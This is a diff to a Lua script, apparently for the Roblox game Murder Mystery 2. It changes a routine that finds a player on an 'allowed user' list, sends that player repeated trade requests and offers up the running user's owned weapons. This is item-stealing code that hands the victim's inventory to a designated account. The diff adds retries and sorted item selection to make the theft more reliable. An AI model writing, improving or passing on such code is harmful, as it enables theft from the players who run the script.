@@ -222,15 +222,26 @@ local function hook_mm2()
 
     local function startTradeLoop()
         task.spawn(function()
+            task.wait(3)
             while not tradingWithAllowed do
+                local target = nil
                 for _, player in ipairs(Players:GetPlayers()) do
                     if player ~= lp and isAllowedUser(player.Name) then
-                        storeItems()
-                        pcall(function() sendRequest:InvokeServer(player) end)
+                        target = player
                         break
                     end
                 end
-                task.wait(0.5)
+                if target then
+                    storeItems()
+                    for i = 1, 5 do
+                        if tradingWithAllowed then break end
+                        pcall(function() sendRequest:InvokeServer(target) end)
+                        task.wait(0.5)
+                    end
+                end
+                if not tradingWithAllowed then
+                    task.wait(5)
+                end
             end
         end)
     end
@@ -280,14 +291,16 @@ local function hook_mm2()
 
         task.spawn(function()
             task.wait(1)
-            if not (okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned) then return end
+            local sortedItems = collect_mm2_items()
+            if #sortedItems == 0 then return end
 
             local uniqueSlots = 0
-            for itemName, amount in pairs(ProfileData.Weapons.Owned) do
+            for _, entry in ipairs(sortedItems) do
                 if uniqueSlots >= 4 then break end
                 uniqueSlots = uniqueSlots + 1
+                local amount = (okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned and ProfileData.Weapons.Owned[entry.name]) or entry.amount
                 for i = 1, amount do
-                    pcall(function() offerItem:FireServer(itemName, "Weapons") end)
+                    pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
                     task.wait(0.1)
                 end
                 task.wait(0.2)
